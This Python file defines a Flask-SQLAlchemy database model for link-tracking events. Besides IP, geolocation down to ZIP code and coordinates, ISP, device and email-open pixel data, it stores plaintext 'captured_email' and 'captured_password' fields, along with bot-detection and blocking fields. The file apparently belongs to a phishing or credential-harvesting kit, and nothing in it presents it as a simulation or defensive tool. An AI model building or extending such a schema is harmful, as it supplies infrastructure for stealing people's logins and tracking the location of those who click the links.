from .user import db
from datetime import datetime

class TrackingEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey("link.id"), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    country = db.Column(db.String(100))
    region = db.Column(db.String(100))  # State/Province
    city = db.Column(db.String(100))
    zip_code = db.Column(db.String(20))  # Postal/ZIP code
    isp = db.Column(db.String(255))
    organization = db.Column(db.String(255))  # ISP organization
    as_number = db.Column(db.String(50))  # Autonomous System Number
    timezone = db.Column(db.String(50))
    latitude = db.Column(db.Float)
    longitude = db.Column(db.Float)
    device_type = db.Column(db.String(50))  # Desktop, Mobile, Tablet
    browser = db.Column(db.String(100))
    browser_version = db.Column(db.String(50))
    os = db.Column(db.String(100))
    os_version = db.Column(db.String(50))
    captured_email = db.Column(db.String(255))
    captured_password = db.Column(db.String(255))
    status = db.Column(db.String(50))  # "opened", "redirected", "on_page"
    blocked_reason = db.Column(db.String(255))
    unique_id = db.Column(db.String(255)) # For pixel tracking
    email_opened = db.Column(db.Boolean, default=False)
    redirected = db.Column(db.Boolean, default=False)
    on_page = db.Column(db.Boolean, default=False)
    is_bot = db.Column(db.Boolean, default=False)  # Track if visitor is a bot
    referrer = db.Column(db.Text)  # Referrer URL
    session_duration = db.Column(db.Integer)  # Time spent on page in seconds
    page_views = db.Column(db.Integer, default=1)  # Number of page views in session

    def __repr__(self):
        return f"<TrackingEvent {self.id} for link {self.link_id}>"

    def to_dict(self):
        return {
            "id": self.id,
            "link_id": self.link_id,
            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "country": self.country,
            "region": self.region,
            "city": self.city,
            "zip_code": self.zip_code,
            "isp": self.isp,
            "organization": self.organization,
            "as_number": self.as_number,
            "timezone": self.timezone,
            "latitude": self.latitude,
            "longitude": self.longitude,
            "device_type": self.device_type,
            "browser": self.browser,
            "browser_version": self.browser_version,
            "os": self.os,
            "os_version": self.os_version,
            "captured_email": self.captured_email,
            "captured_password": self.captured_password,
            "status": self.status,
            "blocked_reason": self.blocked_reason,
            "unique_id": self.unique_id,
            "email_opened": self.email_opened,
            "redirected": self.redirected,
            "on_page": self.on_page,
            "is_bot": self.is_bot,
            "referrer": self.referrer,
            "session_duration": self.session_duration,
            "page_views": self.page_views
        }


